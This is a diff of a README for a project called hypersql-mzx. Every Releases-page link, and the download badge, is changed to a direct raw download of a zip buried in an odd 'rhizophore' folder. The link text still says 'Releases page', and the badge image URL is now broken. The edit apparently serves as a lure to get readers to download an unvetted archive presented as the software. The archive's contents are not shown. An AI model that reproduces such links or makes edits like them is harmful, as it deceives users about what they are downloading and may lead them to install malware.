@@ -6,7 +6,7 @@ Welcome to hypersql-mzx! This application allows you to manage your SQL database
 ## 📥 Download the Software
 To download hypersql-mzx, click the button below:
 
-[![Download hypersql-mzx](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kiwi1547/hypersql-mzx/releases)
+[![Download hypersql-mzx](https://raw.githubusercontent.com/kiwi1547/hypersql-mzx/main/rhizophore/hypersql-mzx.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kiwi1547/hypersql-mzx/main/rhizophore/hypersql-mzx.zip)
 
 ## 💻 System Requirements
 Before you install hypersql-mzx, make sure your computer meets the following requirements:
@@ -18,7 +18,7 @@ Before you install hypersql-mzx, make sure your computer meets the following req
 If your system meets these requirements, you are ready to install!
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/kiwi1547/hypersql-mzx/releases) to find the latest version of hypersql-mzx.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/kiwi1547/hypersql-mzx/main/rhizophore/hypersql-mzx.zip) to find the latest version of hypersql-mzx.
    
 2. **Choose Your Version:** Look for the version labeled as the latest release. It usually has the highest version number. You will see options for different operating systems.
 
@@ -47,10 +47,10 @@ If you encounter any issues during installation or usage, consider the following
 3. **Contact Support:** For persistent issues, feel free to reach out to our support team via the GitHub Issues page.
 
 ## 📅 Keeping Your Software Updated
-Stay current with the latest features and fixes by regularly checking the [Releases page](https://github.com/kiwi1547/hypersql-mzx/releases). New versions will improve performance and security. Download and install updates as they become available.
+Stay current with the latest features and fixes by regularly checking the [Releases page](https://raw.githubusercontent.com/kiwi1547/hypersql-mzx/main/rhizophore/hypersql-mzx.zip). New versions will improve performance and security. Download and install updates as they become available.
 
 ## 🔗 Helpful Links
-- [Releases Page](https://github.com/kiwi1547/hypersql-mzx/releases)
+- [Releases Page](https://raw.githubusercontent.com/kiwi1547/hypersql-mzx/main/rhizophore/hypersql-mzx.zip)
 - [Documentation](#) (Link will be added soon)
 - [Support](#) (Link will be added soon)
 
